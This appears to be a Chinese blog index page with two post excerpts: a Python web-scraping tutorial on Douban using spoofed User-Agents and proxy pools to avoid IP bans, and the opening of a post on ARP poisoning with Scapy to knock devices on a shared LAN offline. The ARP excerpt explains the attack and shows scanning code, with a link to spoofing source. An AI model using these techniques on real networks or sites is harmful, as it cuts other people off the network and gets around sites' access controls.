<li>Ctrl+R刷新页面</li>
<li>选择Network的选项</li>
<li>点击右边的任意一个</li>
<li>左边选择Headers，下拉可以看到User-Agent</li>
<li>将其复制到代码中即可，代码如下：</li>
</ul>
<p><img src="https://i.loli.net/2019/10/21/Hov87YuORg5tV2y.png" alt="User-Agent"></p>
<br>


<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'https://movie.douban.com/chart'</span></span><br><span class="line"><span class="comment"># 添加请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,headers=headers) <span class="comment"># 这里要把请求头送入到请求方法中</span></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<br>


<p><img src="https://i.loli.net/2019/10/21/cjQvBVMePmbh8TF.png" alt="豆瓣图书榜源码"></p>
<br>
绝大多数网站，不加请求头，往往加载不了全部网页内容。
<br>

<h2 id="添加data"><a href="#添加data" class="headerlink" title="添加data"></a>添加data</h2><p>data和User-Agent的作用类似，都是用来伪装成用户的。服务器会根据有没有data和user-agent来判断是否是爬虫还是用户。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">'http://httpbin.org/get'</span></span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">'name'</span>:<span class="string">'germet'</span>,</span><br><span class="line"><span class="string">'age'</span>:<span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response=requests.get(url,data=data)<span class="comment">#或者是params</span></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<h2 id="克制Ajax和JavaScript"><a href="#克制Ajax和JavaScript" class="headerlink" title="克制Ajax和JavaScript"></a>克制Ajax和JavaScript</h2><p>使用selenium首先要安装selenium库，<code>pip install selenium -i https://pypi.tuna.tsinghua.edu.cn/simple</code>。<br>其次，如果是用selenium打开Chrome，还需要安装ChromeDriver驱动。淘宝源ChromeDriver驱动链接，注意版本要和当前Chrome的版本一致。</p>
<blockquote>
<p><a href="http://npm.taobao.org/mirrors/chromedriver/" target="_blank" rel="noopener">http://npm.taobao.org/mirrors/chromedriver/</a></p>
</blockquote>
<p>目前Chrome支持的浏览器有<code>Safari、FireFox、Chrome</code>等，且都需要安装浏览器驱动。</p>
<p>selenium会自动打开浏览器，然后渲染出网页，再关闭浏览器，这样可以克制一切JavaScript渲染，如果想针对Ajax请求，可以用Selenium模拟点击效果，这里只介绍基础的用法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://movie.douban.com/chart'</span></span><br><span class="line"></span><br><span class="line">option = webdriver.ChromeOptions() <span class="comment"># 添加Chrome打开的选项</span></span><br><span class="line"><span class="comment">#option.add_argument('--headless')  # 执行时不打开了浏览器，通常在没有面板的Linux服务器中会用到</span></span><br><span class="line">driver = webdriver.Chrome(options=option)</span><br><span class="line"></span><br><span class="line">driver.get(url) </span><br><span class="line">driver.close() <span class="comment">#关闭浏览器</span></span><br></pre></td></tr></table></figure>

<h2 id="代理IP"><a href="#代理IP" class="headerlink" title="代理IP"></a>代理IP</h2><p>一个IP地址对服务器过于频繁的访问，会导致服务器屏蔽你的IP地址。爬虫通常使用代理IP池来处理自己IP被封的情况。</p>
<p>可以使用Github上已经写好的代理池</p>
<blockquote>
<p><a href="https://github.com/jhao104/proxy_pool" target="_blank" rel="noopener">https://github.com/jhao104/proxy_pool</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">url = <span class="string">'https://movie.douban.com/chart'</span></span><br><span class="line"></span><br><span class="line">proxy=&#123;</span><br><span class="line">    <span class="string">'http'</span>:<span class="string">'http://127.0.0.1:9743'</span>,</span><br><span class="line">    <span class="string">'https'</span>:<span class="string">'https://127.0.0.1:9743'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response=requests.get(url,proxies=proxy)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>

<h2 id="超时设置"><a href="#超时设置" class="headerlink" title="超时设置"></a>超时设置</h2><p>通常用于访问一些地方较远的网站，或者访问的网站当前过于繁忙，可以设置超时。一旦请求时间超过一定的值，服务器还没有返回响应，那么就直接退出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ReadTimeout</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url,timeout=<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">except</span> ReadTimeout:</span><br><span class="line">    print(<span class="string">'Timeout'</span>)</span><br><span class="line"></span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>

<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p>requests还可以用来下载各种文件，比如图片、音乐、视频等。这里用一个例子演示一下：</p>
<p>下载《雨幕》这首歌：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'https://sharefs.yun.kugou.com/201910211352/d2b8f1ce854a7f4d01937583ee35b46e/G172/M00/0D/14/jJQEAF2hoIGATyZ4ADq0vjCqr7Q097.mp3'</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url) <span class="comment"># 这里要把请求头送入到请求方法中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存到文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'雨幕.mp3'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(response.content)</span><br></pre></td></tr></table></figure>

<h1 id="解析网页"><a href="#解析网页" class="headerlink" title="解析网页"></a>解析网页</h1><p>解析网页一般用到的库有<code>BeautifulSoup,PyQuery,re</code>，BeautifulSoup又称之为bs4，要区别于之前的bs3。bs4和PyQuery类似，都是通过网页的节点(&lt;div&gt; …&lt;/div&gt; 这样的东西称之为结点)来定位内容的。</p>
<p>而re是直接匹配内容，更加灵活。下面是re匹配表，虽然多，但通常我们只需要用到 <code>. * ?</code>这三个符号。</p>
<p>re正则表达式，正则就是用一些具有特殊含义的符号组合到一起（称为正则表达式）来描述字符或者字符串的方法。或者说：正则就是用来描述一类事物的规则。（在Python中）它内嵌在Python中，并通过 re 模块实现。正则表达式模式被编译成一系列的字节码，然后由用 C 编写的匹配引擎执行。</p>
<table>
<thead>
<tr>
<th align="left">元字符</th>
<th align="left">匹配内容</th>
</tr>
</thead>
<tbody><tr>
<td align="left">\w</td>
<td align="left">匹配字母（包含中文）或数字或下划线</td>
</tr>
<tr>
<td align="left">\W</td>
<td align="left">匹配非字母（包含中文）或数字或下划线</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">匹配任意的空白符</td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">匹配任意非空白符</td>
</tr>
<tr>
<td align="left">\d</td>
<td align="left">匹配数字</td>
</tr>
<tr>
<td align="left">\D</td>
<td align="left">匹配非数字</td>
</tr>
<tr>
<td align="left">\A</td>
<td align="left">从字符串开头匹配</td>
</tr>
<tr>
<td align="left">\z</td>
<td align="left">匹配字符串的结束，如果是换行，只匹配到换行前的结果</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">匹配一个换行符</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">匹配一个制表符</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">匹配字符串的开始</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配字符串的结尾</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。</td>
</tr>
<tr>
<td align="left">[…]</td>
<td align="left">匹配字符组中的字符</td>
</tr>
<tr>
<td align="left">[^…]</td>
<td align="left">匹配除了字符组中的字符的所有字符</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">匹配0个或者多个左边的字符。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">匹配一个或者多个左边的字符。</td>
</tr>
<tr>
<td align="left">？</td>
<td align="left">匹配0个或者1个左边的字符，非贪婪方式。</td>
</tr>
<tr>
<td align="left">{n}</td>
<td align="left">精准匹配n个前面的表达式。</td>
</tr>
<tr>
<td align="left">{n,m}</td>
<td align="left">匹配n到m次由前面的正则表达式定义的片段，贪婪方式</td>
</tr>
<tr>
<td align="left">()</td>
<td align="left">匹配括号内的表达式，也表示一个组</td>
</tr>
<tr>
<td align="left">[:alnum:]</td>
<td align="left">字母和数字</td>
</tr>
<tr>
<td align="left">[:alpha:]</td>
<td align="left">字母</td>
</tr>
<tr>
<td align="left">[:ascii:]</td>
<td align="left">ascii字符</td>
</tr>
<tr>
<td align="left">[:blank:]</td>
<td align="left">空白字符</td>
</tr>
<tr>
<td align="left">[:cntrl:]</td>
<td align="left">控制字符包括换行符、换页符、退格符</td>
</tr>
<tr>
<td align="left">[:digit:]</td>
<td align="left">数字</td>
</tr>
<tr>
<td align="left">[:graph:]</td>
<td align="left">非控制、非空格字符</td>
</tr>
<tr>
<td align="left">[:lower:]</td>
<td align="left">小写字母</td>
</tr>
<tr>
<td align="left">[:print:]</td>
<td align="left">可打印字符</td>
</tr>
<tr>
<td align="left">[:punct:]</td>
<td align="left">标点符号字符</td>
</tr>
<tr>
<td align="left">[:space:]</td>
<td align="left">空白字符</td>
</tr>
<tr>
<td align="left">[:upper:]</td>
<td align="left">大写字母</td>
</tr>
<tr>
<td align="left">[:xdigit:]</td>
<td align="left">十六进制数字</td>
</tr>
<tr>
<td align="left">^$</td>
<td align="left">匹配空行</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">词首</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">词尾</td>
</tr>
<tr>
<td align="left">&lt;pattern&gt;</td>
<td align="left">整个单词</td>
</tr>
</tbody></table>
<hr>
<p>重点</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>？</td>
<td>匹配0个或者1个左边的字符，非贪婪方式。</td>
</tr>
<tr>
<td>.</td>
<td>匹配任意字符，除了换行符。</td>
</tr>
<tr>
<td>*</td>
<td>匹配*号前的字符0次或多次。</td>
</tr>
</tbody></table>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.*? 的含义就是 非贪婪匹配前面任意字符</span><br></pre></td></tr></table></figure>

<p>通常采用的组合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#re.complie写re表达式</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">如果不使用re.S参数，则只在每一行内进行匹配，如果一行没有，就换下一行重新开始。</span></span><br><span class="line"><span class="string">而使用re.S参数以后，正则表达式会将这个字符串作为一个整体，在整体中进行匹配。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">parent = re.compile(<span class="string">'&lt;div.*?页数:.*?&lt;/span&gt;(.*?)&lt;br/&gt;'</span>, re.S)</span><br><span class="line"></span><br><span class="line"><span class="comment">#re.findall查找html的内容并和parent匹配，返回一个列表。</span></span><br><span class="line">result = re.findall(page_parent, html)</span><br></pre></td></tr></table></figure>

<h1 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h1><p>爬取豆瓣电影榜。这个会用到我们之前在<code>发起请求 -- 添加请求头</code>中写的内容，这里主要关注re解析的过程。</p>
<p>首选选中一个item，观察它在源码的什么位置，然后折叠源码。</p>
<p><img src="https://i.loli.net/2019/10/21/bw659mYLhFJRyxr.png" alt="一个item"></p>
<br>
折叠源码后，可以看到选中的这些都十分相似，判断一下可知，他们就是每一部电影的html源码。这样就得到了电影榜单的一般格式。

<p><img src="https://i.loli.net/2019/10/21/ZNOmvfTBdMAj3a5.png" alt="item列表"></p>
<br>
依次选取关键字，用来生成re表达式。我们选中了`table width,class="item" class="nbg" title`这些关键字。

<p><img src="https://i.loli.net/2019/10/21/BzO7qV8NYpbWUg4.png" alt="image.png"></p>
<p>所以，re表达式是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用括号选出你需要的内容</span></span><br><span class="line">pattern = re.compile(<span class="string">'table.*?class="item".*?nbg.*?title="(.*?)"'</span>,re.S)</span><br></pre></td></tr></table></figure>

<p>选中的有些内容其实并不必要，我们就将它去除掉了。具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'https://movie.douban.com/chart'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#请求request</span></span><br><span class="line">response = requests.get(url,headers=headers)</span><br><span class="line">html = response.text</span><br><span class="line"></span><br><span class="line"><span class="comment">#解析</span></span><br><span class="line">pattern = re.compile(<span class="string">'table.*?class="item".*?nbg.*?title="(.*?)"'</span>,re.S)</span><br><span class="line">result = re.findall(pattern,html)</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://i.loli.net/2019/10/21/ErF297sh5xbgpqk.png" alt="爬虫效果"></p>
<p>如果想要输出更美观，还可以添加一些字段处理等：<br><br></p>
<p><img src="https://i.loli.net/2019/10/21/9FnVA4Yy61NdpZM.png" alt="美化效果"></p>

            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/10/21/Python%E7%88%AC%E8%99%AB%E5%A4%A7%E7%BA%B2%E6%A6%82%E8%BF%B0/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/10/21/Python%E7%88%AC%E8%99%AB%E5%A4%A7%E7%BA%B2%E6%A6%82%E8%BF%B0/" title="Python爬虫大纲概述">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/1.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="">编程</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/">
    		Python实现ARP欺骗屏蔽局域网
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-07-27T12:20:53.000Z">2019-07-27</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <center>Arp欺骗 ---- Python实现</center>
## 简介
    1、ARP是地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。
    2、当计算机知道IP地址和MAC地址，就会向局域网中发送信息，默认发给默认网关，如果是发到局域网外的信息，则用源主机IP+目的
    这两点是构造ARP毒化攻击的基本原理。
----
    ARP毒化攻击可以干什么？
        ARP毒化可以让局域网内的消息都发往你指定的网关，简而言之就是让本地局域网全部断网，让连接同一个WiFi的设备都上不了网。

<hr>
<pre><code>如何做到的？
计算机、手机、Ipad上网的数据传输发包格式为：
源IP--自己的IP
源MAC--自己的物理地址
目的IP--如180.101.49.12 == www.baidu.com
目的MAC--本地局域网的默认网关MAC

1、目标主机通过ARP广播(由此可见ARP是用UDP协议实现)得到默认网关MAC地址
2、攻击者通过不断地发送(默认网关IP+非默认网关MAC)的形式，更改目标主机中的ARP缓存表
3、目标主机向默认路由发送消息
4、消息在局域网内传播，但不会通过MAC地址流入默认路由器，故默认路由器也不会转发目标主机的消息，目标主机断网。

即通过ARP毒化，让目标主机不能通过ARP协议，完成正确的地址映射。</code></pre><hr>
<pre><code>攻击者如何向目标主机发送(默认网关IP+非默认网关MAC)？
通过Python3的Scapy库来实现。</code></pre><h2 id="1、Scapy工具介绍"><a href="#1、Scapy工具介绍" class="headerlink" title="1、Scapy工具介绍"></a>1、Scapy工具介绍</h2><p>scapy官方文档</p>
<blockquote>
<p><a href="https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/)" target="_blank" rel="noopener">https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/)</a></p>
</blockquote>
<pre><code>安装 pip install scapy</code></pre><p>Scapy可用于构造、发送、解析各类数据包。可以用来扫描，跟踪路由，探测，单元测试，攻击或网络发现。</p>
<pre><code>默认包：以太网头部/IP头部/TCP头部
pkg=Ehter()/IP()/TCP()
pkg.show()</code></pre><p><strong>默认以太网头部</strong></p>
<pre><code>###[ Ethernet ]### 
dst= ff:ff:ff:ff:ff:ff
src= 00:00:00:00:00:00
type= IPv4</code></pre><p><strong>默认IP头部</strong></p>
<pre><code>###[ IP ]### 
     version= 4
     ihl= None
     tos= 0x0
     len= None
     id= 1
     flags= 
     frag= 0
     ttl= 64
     proto= tcp
     chksum= None
     src= 127.0.0.1
     dst= 127.0.0.1
     \options\</code></pre><p><strong>默认TCP头部</strong></p>
<pre><code>###[ TCP ]### 
        sport= ftp_data //默认20
        dport= http            //默认80
        seq= 0
        ack= 0
        dataofs= None
        reserved= 0
        flags= S
        window= 8192
        chksum= None
        urgptr= 0
        options= []</code></pre><h2 id="2、ARP协议简介"><a href="#2、ARP协议简介" class="headerlink" title="2、ARP协议简介"></a>2、ARP协议简介</h2><p>ARP协议实现IP（32bit）地址到MAC（48bit）地址之间的动态映射（由操作系统完成，用户不必关注），多路访问都会用到IP地址</p>
<hr>
<p><strong>实现的具体过程</strong></p>
<pre><code>源主机发送ARP广播报文段，在报文段中填入自己的IP地址，目标的IP地址，以及自己的MAC地址

同一个局域网内的主机都接受该报文段，并与自己的IP地址相比较
如果相同，则发送ARP响应报文，在响应报文中填入自己的MAC地址等
如果不同，则丢弃
源主机接收到目标主机发出的ARP响应报文，放入ARP缓存表</code></pre><p><strong>scapy包结构</strong></p>
<pre><code>###[ ARP ]### 
        hwtype= 0x1         //硬件类型 1：Ethernet
        ptype= IPv4            
        hwlen= None
        plen= None
        op= who-has
        hwsrc= 00:0c:29:ab:65:55    //hardware source 硬件源地址
        psrc= 192.168.3.37                //源IP地址
        hwdst= None                                //hardware destination 硬件目的地址
        pdst= None                                //目的IP地址</code></pre><p><img src="https://i.loli.net/2019/08/30/DZQyihm8xXTkr5N.png" alt="ARP包结构"></p>
<h2 id="3、Scapy实现ARP扫描"><a href="#3、Scapy实现ARP扫描" class="headerlink" title="3、Scapy实现ARP扫描"></a>3、Scapy实现ARP扫描</h2><pre><code>&apos;&apos;&apos;
sr()  发一个，也可以接受好几个包
sr1() 发一个包，可能会收到很多包，但我只接受第一个
srp() 发多个，收多个，p代表工作在二层（以太网层）
send() 只管发
sendp() 需要手动填以太网的信息
&apos;&apos;&apos;</code></pre><p>最基本的ARP请求响应</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">localmac=<span class="string">'00:0c:29:ab:65:55'</span></span><br><span class="line">localip=<span class="string">'192.168.3.37'</span></span><br><span class="line">destip=<span class="string">'192.168.3.31'</span></span><br><span class="line">destmac=destmac</span><br><span class="line"></span><br><span class="line">pkg=srp(Ether(src=localmac,dst=<span class="string">'FF:FF:FF:FF:FF:FF'</span>)/ARP(op=<span class="number">1</span>,hwsrc=localmac,hwdst=<span class="string">'00:00:00:00:00:00'</span>),iface=<span class="string">'ens32'</span>,verbose=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># op=1:ARP Request</span></span><br><span class="line"><span class="comment"># iface：网卡</span></span><br><span class="line"><span class="comment"># timeout:设置等待时间</span></span><br><span class="line"><span class="comment"># verbose：不打印输出</span></span><br></pre></td></tr></table></figure>

<h3 id="ARP响应的解析—Scapy——ARP数据结构分析"><a href="#ARP响应的解析—Scapy——ARP数据结构分析" class="headerlink" title="ARP响应的解析—Scapy——ARP数据结构分析"></a>ARP响应的解析—Scapy——ARP数据结构分析</h3><p><img src="https://i.loli.net/2019/08/30/gzkyjEhnPbaBd6R.jpg" alt="scapy发收包的数据结构"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;pkg</span><br><span class="line"><span class="comment"># (&lt;Results: TCP:0 UDP:0 ICMP:0 Other:1&gt;, &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;) //元祖</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>]	//选择响应的ARP包</span><br><span class="line"><span class="comment"># &lt;Results: TCP:0 UDP:0 ICMP:0 Other:1&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res //生成收发包的清单</span><br><span class="line"></span><br><span class="line"><span class="comment">#用列表容纳收发队列组成的元祖，对应一组计算机[</span></span><br><span class="line">第一个收发(</span><br><span class="line">	<span class="comment"># 发送的包&lt;Ether  dst=FF:FF:FF:FF:FF:FF src=00:0c:29:ab:65:55 type=ARP |&lt;ARP  op=who-has hwsrc=00:0c:29:ab:65:55 psrc=192.168.3.37 pdst=192.168.3.31 |&gt;&gt;,</span></span><br><span class="line">	<span class="comment"># 接受的包&lt;Ether  dst=00:0c:29:ab:65:55 src=58:00:e3:d7:d5:ef type=ARP |&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=58:00:e3:d7:d5:ef psrc=192.168.3.31 hwdst=00:0c:29:ab:65:55 pdst=192.168.3.37 |&lt;Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |&gt;&gt;&gt;)]</span></span><br><span class="line"><span class="comment"># 元祖--包含了收发的所有包</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>] //选择第一个收发的包</span><br><span class="line"><span class="comment">#就对应一个计算机(</span></span><br><span class="line">&lt;Ether  dst=FF:FF:FF:FF:FF:FF src=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> type=ARP |&lt;ARP  op=who-has hwsrc=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> psrc=<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span> pdst=<span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> |&gt;&gt;,</span><br><span class="line">&lt;Ether  dst=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> src=<span class="number">58</span>:<span class="number">00</span>:e3:d7:d5:ef type=ARP |&lt;ARP  hwtype=<span class="number">0x1</span> ptype=IPv4 hwlen=<span class="number">6</span> plen=<span class="number">4</span> op=<span class="keyword">is</span>-at hwsrc=<span class="number">58</span>:<span class="number">00</span>:e3:d7:d5:ef psrc=<span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> hwdst=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> pdst=<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span> |&lt;Padding  load=<span class="string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span> |&gt;&gt;&gt;</span><br><span class="line">)</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>] //选择响应的那一部分</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>].fields//选择响应的那一部分的以太网头部</span><br><span class="line"><span class="comment">#&#123;'dst': '00:0c:29:ab:65:55', 'src': '58:00:e3:d7:d5:ef', 'type': 2054&#125;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields //选择响应的那一部分的ARP头部</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	'hwtype': 1,</span></span><br><span class="line"><span class="string">	'ptype': 2048, </span></span><br><span class="line"><span class="string">	'hwlen': 6, </span></span><br><span class="line"><span class="string">	'plen': 4, </span></span><br><span class="line"><span class="string">	'op': 2, </span></span><br><span class="line"><span class="string">	'hwsrc': '58:00:e3:d7:d5:ef',</span></span><br><span class="line"><span class="string">	'psrc': '192.168.3.31', </span></span><br><span class="line"><span class="string">	'hwdst': '00:0c:29:ab:65:55', </span></span><br><span class="line"><span class="string">	'pdst': '192.168.3.37'</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields[<span class="string">'hwsrc'</span>]  //提取目标mac地址，也就是当前目标发包的源mac地址</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields[<span class="string">'psrc'</span>]</span><br></pre></td></tr></table></figure>



<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><blockquote>
<p><a href="https://github.com/ArchKS/Python/tree/master/ArpSpoof" target="_blank" rel="noopener">https://github.com/ArchKS/Python/tree/master/ArpSpoof</a></p>
</blockquote>
<h2 id="4、Scapy监听ARP异常"><a href="#4、Scapy监听ARP异常" class="headerlink" title="4、Scapy监听ARP异常"></a>4、Scapy监听ARP异常</h2><ul>
